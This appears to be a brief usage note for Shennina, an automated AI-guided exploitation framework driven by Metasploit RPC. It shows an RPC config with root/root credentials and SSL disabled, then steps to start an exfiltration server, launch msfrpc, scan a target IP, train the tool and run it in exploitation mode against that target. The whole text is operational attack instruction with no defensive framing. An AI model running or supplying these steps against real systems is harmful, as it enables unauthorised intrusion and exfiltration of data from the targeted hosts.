# Shennina

/config/msfrpg-config.json

{
  "password": "root",
  "user": "root",
  "host": "172.17.0.1",
  "port": 55553,
  "ssl": false
}

## Step 1 Shell 1

# -------runs exfiltration server (separeted console)

cd ./exfiltration-server/

sudo ./run-server.sh

## Step 2 Shell 2

# ------runs msfconsole (separeted console)

./scripts/run-msfrpc.py

## Step 3 Shell 3

# ------runs shennina

./shennina.py --initialize-exploits-tree


#------ scanning phase------# (Replace $TARGET_IP with the IP which is to be attacked). 127.0.0.1 is the kali localhost that runs metasplpit RPC. Otherwise you define another IP.

sudo ./shennina.py --lhost 127.0.0.1 --target $TARGET_IP --service-scan-only

# ------------- training shennina ------------------#
sudo ./shennina.py --target $TARGET_IP --lhost 127.0.0.1 --training-mode

# --------------- attacking with recommended exploit given by shennina AI -------------------#
sudo ./shennina.py --target $TARGET_IP --lhost 127.0.0.1 --exploitation-mode



